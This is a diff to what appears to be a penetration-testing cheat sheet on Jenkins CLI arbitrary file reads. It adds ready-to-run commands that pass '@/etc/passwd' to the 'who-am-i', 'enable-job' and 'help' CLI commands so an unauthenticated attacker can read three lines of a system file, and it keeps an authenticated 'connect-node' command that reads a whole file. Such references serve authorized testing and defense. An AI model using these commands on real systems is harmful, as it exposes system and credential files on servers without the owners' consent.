@@ -11,9 +11,18 @@ Authenticated, can retrieve a complete file:
 java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins -auth abc:abc connect-node "@/etc/passwd"
 ```
 
-Unauthenticated or missing Global/Read permissions, can only read 1 line:
+Unauthenticated or missing Global/Read permissions, can only read 3 lines:
+Read first line:
 ```
 java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins who-am-i "@/etc/passwd"
+```
+Read second line:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins enable-job "@/etc/passwd"
+```
+Read third line:
+```
+java -jar jenkins-cli.jar -noCertificateCheck -s https://xxx.yyy/jenkins help "@/etc/passwd"
 ```
 
 Deserialization RCE in old Jenkins (CVE-2015-8103, Jenkins 1.638 and older)
